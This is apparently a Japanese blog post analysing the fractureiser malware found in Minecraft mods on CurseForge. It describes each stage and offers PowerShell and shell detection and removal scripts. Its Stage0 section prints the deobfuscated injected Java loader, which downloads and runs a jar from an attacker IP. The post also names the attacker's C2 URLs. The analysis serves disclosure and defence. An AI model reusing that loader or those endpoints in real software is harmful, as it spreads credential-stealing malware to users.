---
title: "今話題のfractureiserとは"
date: 2023-06-08
draft: false
slug: forge_fractureiser
image: forge.png
categories:
    - Minecraft
readingtime: false
links:
  - title: 最新情報(海外の有志による情報まとめ)
    description: 最新の情報を得たい方向け
    website: https://github.com/fractureiser-investigation/fractureiser
    image: https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png

  - title: 参考にさせていただいたサイト
    description: 一番最初に日本向けに情報提供された方です。一部参考にさせていただきました。
    website: https://zenn.dev/toliner/articles/19d1b06da5db81
    image: https://pbs.twimg.com/profile_images/1192775453498494977/pb8Shc8G_400x400.jpg
---
## はじめに
みなさん、お久しぶりです。クリスタと申します。最近話題になっているマルウェア、「fractureiser」についてわかっている範囲でまとめようと思います。

## fractureiserとは
fractureiserは、MinecraftのMOD/プラグインをターゲットにしたマルウェアで、2023/06/01に海外のプレイヤーによって発見されました。
そのファイルが、Curse ForgeからダウンロードしたMODから検出されたため、Curse Forgeが直ちに声明を発表しました。
現在は、海外の有志によってこのファイルをソースコードに直す作業がされており、そのソースコードからどのような挙動をするのかが一部解明されています。また、アップロードの日付を確認したところ古くて2023年4月から既に存在していたものとみられています。
このマルウェアは複数のステージで構成されており、各ステージごとに実行される処理が異なるという特徴があります。

## このマルウェアによる影響
<span style="color: red; ">**WindowsあるいはLinuxで使用しているほぼすべてのMOD・プラグインに影響が出る恐れがあります。また、Minecraftのクライアント本体、サーバーにも影響が出る恐れが追加で発表されました。**</span>直近3週間～1ヵ月の間にCurse Forgeから何らかのMODをダウンロードした場合はマルウェアに感染している可能性が大きいため、後述する検出ツールの使用をおすすめします。  
現時点でMac上での影響は確認されていません。また、Stage3によって感染してマルウェアが実行されてしまった場合は<span style="color: red; ">Minecraftとは関連のないすべてのjarファイルに感染を起こす可能性があります。</span>  

・MOD/プラグイン開発者向け  
このマルウェアにより、Mavenリポジトリへの影響も考えられます。

現時点でウイルスがアップロードされているサーバーが停止しているため新たな感染はほぼ不可能ですが既存のjarファイルによる活動が続いている可能性があります。

{{< notice note >}}
**ここから先は主にデベロッパー(MOD・プラグイン開発者あるいはそれに関連した知識を持つ方)向けの内容になります。検知方法に移動する場合は下のリンクをクリックしてください。** 

[→検知方法に移動](#検知方法)
{{< /notice >}}

## マルウェアの活動内容
このマルウェアはStage0からStage3に分かれ、最初はStage0から、最後にマルウェア本体のStage3で構成されています。  
ここから先の内容は一つずつ展開して読むことができます。

<details>
<summary>Stage0</summary>

### Stage0
Stage0は、Stage3によって感染したjarファイルにあります。Stage3によって感染したjarファイルの中に次のようなコードが記載されています。
また、このコードは難読化されているため一部処理が数字の羅列になっています。
```java
static void _1685f49242dd46ef9c553d8af1a4e0bb() {
  Class.forName(new String(new byte[] {
      // "Utility"
    85, 116, 105, 108, 105, 116, 121
  }), true, (ClassLoader) Class.forName(new String(new byte[] {
      // "java.net.URLClassLoader"
    106, 97, 118, 97, 46, 110, 101, 116, 46, 85, 82, 76, 67, 108, 97, 115, 115, 76, 111, 97, 100, 101, 114
  })).getConstructor(URL[].class).newInstance(new URL[] {
    new URL(new String(new byte[] {
        // "http"
      104, 116, 116, 112
    }), new String(new byte[] {
        // "85.217.144.130"
      56, 53, 46, 50, 49, 55, 46, 49, 52, 52, 46, 49, 51, 48
    }), 8080, new String(new byte[] {
        // "/dl"
        47, 100, 108
        }))
  })).getMethod(new String(new byte[] {
      // "run"
    114, 117, 110
  }), String.class).invoke((Object) null, "-114.-18.38.108.-100");
}
```
Stage0の具体的な処理は次の通りです。
1. `http://[85.217.144.130:8080]/dl`に接続して、`dl.jar`というファイルをダウンロード
2. 1でダウンロードしたファイルを上記コードの`Utility`に渡して実行

現在、URL先のページは閉鎖されていますが、URLの差し替えがあったケースもあるようです。
</details>

<details>
<summary>Stage1</summary>

### Stage1
Stage0でダウンロードされた`dl.jar`の処理部分です。  
Stage0にある`Utility.run`がシステムプロパティかどうか確認し、存在する場合は処理を停止し、存在しない場合は空の文字列を設定して続行。
これにより、マルウェアの二重起動がされないようにしている模様です。    
また、`https://files-8ie.pages.dev/ip`にアクセスし、攻撃者が操作するサーバーのIPアドレスを取得します。その後、Stage2のファイルをダウンロードします。(Windowsは`libWebGL64.jar`、Linux`lib.jar`)  
ダウンロードしたファイルをシステム起動時に実行できるようWindowsは、`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`にレジストリのキーを作成し、Linuxは`systemd`で`systemd-utility.service`というサービスを作成して起動します。  
これらを要約すると、
1. マルウェアが二重起動しないよう確認する
2. `https://files-8ie.pages.dev/ip`から最新のダウンロードURLを取得し、そこからファイルをダウンロード。ダウンロードしたファイルをシステム起動時に実行されるようにする。

となります。
</details>

<details>
<summary>Stage2</summary>

### Stage2
Stage2は、Allatori obfuscatorというJavaのソースコードを難読化するツールで難読化されていますが、大体の処理は判明しているようです。
1. ポート9655を開け、JVM(Java仮想マシン)が閉じたら該当のポートを閉じる
2. `.ref`が存在する場合、ファイルから識別子を読み取る
3. `https://[files-8ie.pages.dev]:8083/ip`に接続し、Stage3の`client.jar`をダウンロードする
4. `dev.neko.nekoclient.Client#start(InetAddress, refFileBytes)` を呼び出す

現在判明しているSHA:
|  SHA1  |  Detail  |
| :----: | :----: |
|`52d08736543a240b0cbbbf2da03691ae525bb119`| - |
|`6ec85c8112c25abe4a71998eb32480d266408863`|D3SL以前のアップロード|
</details>

<details>
<summary>Stage3</summary>

### Stage3
Stage3は、ほかのStageに比べて難読処理かつ複雑な処理になっています。ただし、難読処理がされる前のソースが見つかり、それによってどのような挙動をするのかがほぼわかっています。現段階で確認されている挙動は、
- クリップボードの内容を読み取る
- Microsoft アカウント、Discordなどの認証情報を盗む
- クリップボード内の暗号通貨アドレスを、攻撃者が所有していると思われる代替アドレスに置き換え
- **すべてのjarファイルに対し、Stage0の処理を挿入しようとする**

となっています。これによりマルウェア拡大のリスクが大きくなっています。
</details>

## 検知方法
現時点で、Stage0、Stage1をセキュリティソフトが検知できるように定義ファイルが作成されました。最新版に更新することで見つけることができますが、確実に見つける場合はCurse Forgeの親会社のOverWolfがリリースした検知ツールを使用することでStage3までを検知できます。ただし、確実に検知できるかは不明です。
- [Curse Forge 検知ツールのダウンロード](https://github.com/overwolf/detection-tool/releases)

リンク先から使っているOSごとのファイルをダウンロードしてください。Windowsの場合は、`detection-tool-x-x-x-win.exe`を選択します。

また、スクリプトファイルをダウンロードあるいはコピーして実行することもできます。
<details>
<summary>Windows版(PowerShell)</summary>
次のスクリプトをコピーして`detect.ps1`として保存するか、ダウンロードすることができます。

```ps1
$appData = "$HOME\AppData"
$edgePath = "$appData\Local\Microsoft Edge"

$badPaths = @(
        "$edgePath\.ref",
        "$edgePath\client.jar"
        "$edgePath\lib.dll",
        "$edgePath\libWebGL64.jar",
        "$edgePath\run.bat",
        "$appData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\run.bat",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\t"
)

$res = $false

ForEach ($Path in $badPaths) {
        if (Test-Path -Path $Path) {
                Write-Host "bad file found! removing $Path..."
                Remove-Item -Force $Path
                $res = $true
        }
}

if (!($res)) {
                Write-Host "nothing found! :)"
}

Read-Host -Prompt "press any button to exit"
```

[ファイルをダウンロード](https://prismlauncher.org/img/news/cf-compromised/check_cf.ps1)
</details>

<details>
<summary>Linux版(shell)</summary>
次のスクリプトをコピーして`detect.ps1`として保存するか、ダウンロードすることができます。

```sh
service_file="systemd-utility"
data_dir="$HOME/.config/.data"
bad_paths=(
        "$data_dir/.ref"
        "$data_dir/client.jar"
        "$data_dir/lib.jar"
        "$HOME/.config/systemd/user/$service_file"
        "/etc/systemd/system/$service_file"
)

res="true"
for path in "${bad_paths[@]}"; do
        if [ -f "$path" ]; then
                echo "bad file found! removing $path..."
                rm --force "$path"
                res="false"
        fi
done

if [ "$res" == "true" ]; then
        echo "nothing found :)"
fi
```

[ファイルをダウンロード](https://prismlauncher.org/img/news/cf-compromised/check_cf.sh)
</details>

Stage3に感染してしまった場合、ほぼすべてのjarファイルが悪意あるコードに書き換えられる恐れがあります。ただし、現在攻撃者のサーバーがほぼすべてダウンしているため、新たに感染する可能性は低いものの新しくサーバーができる可能性も考えられます。

## 対策
Minecraft JE 1.20がリリースされMODを使って楽しみたいという方も少なくないでしょう。ただ、まだStage3の他の機能などわからない部分が多いため、MODサーバー、MODを使ってシングルプレイをやめることをおススメします。特に最近ダウンロードしたMOD・プラグインには注意です。

## 最後に
このブログは2023/06/08現在の情報です。最新情報を知りたい場合はこのページの最後から移動することができますので参照してください。
